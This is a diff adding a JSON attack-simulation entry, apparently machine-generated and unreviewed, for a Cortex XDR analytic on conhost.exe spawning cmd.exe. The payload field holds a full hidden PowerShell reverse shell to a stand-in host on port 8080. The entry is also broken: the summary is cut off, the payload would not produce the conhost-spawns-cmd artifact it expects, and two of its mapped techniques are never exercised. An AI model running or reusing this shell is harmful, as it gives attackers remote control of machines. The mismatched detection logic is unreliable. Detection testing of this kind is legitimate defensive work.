@@ -1,0 +1,188 @@
+{
+  "id": "TTP-0000-0076",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Conhost Spawning Suspicious Cmd Process",
+    "summary": "An attacker uses conhost.exe to spawn a cmd.exe process with suspicious command-line arguments, potentially to execute malicious code or establish persistence. Cortex should detect this behavior as a ",
+    "description": "An attacker uses conhost.exe to spawn a cmd.exe process with suspicious command-line arguments, potentially to execute malicious code or establish persistence. Cortex should detect this behavior as a deviation from normal process spawning patterns."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell.exe -NoP -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('192.0.2.10',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendback2_bytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendback2_bytes,0,$sendback2_bytes.Length);$stream.Flush()};$client.Close()\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Conhost.exe spawning cmd.exe",
+        "expected_value": "actor_process_image_name = 'conhost.exe' and action_process_image_name = 'cmd.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10' and dst_port = 8080"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Conhost Spawning Cmd with Suspicious Args",
+        "description": "Detection of conhost.exe spawning cmd.exe with suspicious command-line arguments",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'conhost.exe' and action_process_image_name = 'cmd.exe'\n| filter action_process_command_line contains 'powershell' or action_process_command_line contains 'iex'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1047"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious Cmd Execution via Conhost",
+        "description": "Behavioral deviation where conhost.exe spawns cmd.exe with PowerShell execution flags",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'conhost.exe' and action_process_image_name = 'cmd.exe'\n| filter action_process_command_line contains 'powershell' or action_process_command_line contains 'iex'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name = 'conhost.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1047"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect Conhost Spawning Cmd with PowerShell",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'conhost.exe' and action_process_image_name = 'cmd.exe'\n| filter action_process_command_line contains 'powershell' or action_process_command_line contains 'iex'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Conhost.exe spawned a suspicious cmd process; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/conhost-exe-spawned-a-suspicious-cmd-process"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Conhost.exe spawned a suspicious cmd process",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/conhost-exe-spawned-a-suspicious-cmd-process",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1047",
+      "url": "https://attack.mitre.org/techniques/T1047/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1070.003",
+      "url": "https://attack.mitre.org/techniques/T1070/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
